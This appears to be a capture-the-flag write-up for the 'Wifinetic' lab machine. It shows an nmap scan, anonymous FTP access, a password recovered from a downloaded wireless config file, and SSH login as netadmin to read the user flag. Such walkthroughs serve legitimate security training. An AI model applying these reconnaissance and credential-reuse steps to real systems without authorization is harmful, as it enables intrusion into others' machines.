## Wifinetic

Scan with `nmap`

```shell
# Nmap 7.80 scan initiated Sat Feb 17 21:22:10 2024 as: nmap --open -T4 -sV --min-rate 5000 -vvv -o version 10.10.11.247
Nmap scan report for 10.10.11.247 (10.10.11.247)
Host is up, received conn-refused (0.25s latency).
Scanned at 2024-02-17 21:22:10 -03 for 2s
Not shown: 995 closed ports, 2 filtered ports
Reason: 995 conn-refused and 2 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE    REASON  VERSION
21/tcp open  ftp        syn-ack vsftpd 3.0.3
22/tcp open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped syn-ack
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 17 21:22:12 2024 -- 1 IP address (1 host up) scanned in 2.32 seconds
```

Connect to FTP via anonymous login

```shell
ftp <IP>
```

When prompted for a username, type `anonymous` and press enter. When prompted for a password, press enter.

Download files in the FTP server

```shell
get <file>
```

In the `etc/config/wireless` there is a password
In the `etc/passwd` there is one user with a home which is `netadmin`

With these credentials, we can connect to the SSH server

```shell
ssh netadmin@<IP>
```

We can find the user flag in the home directory of `netadmin`

```shell
cat user.txt
```

Success! We have the user flag. 🏁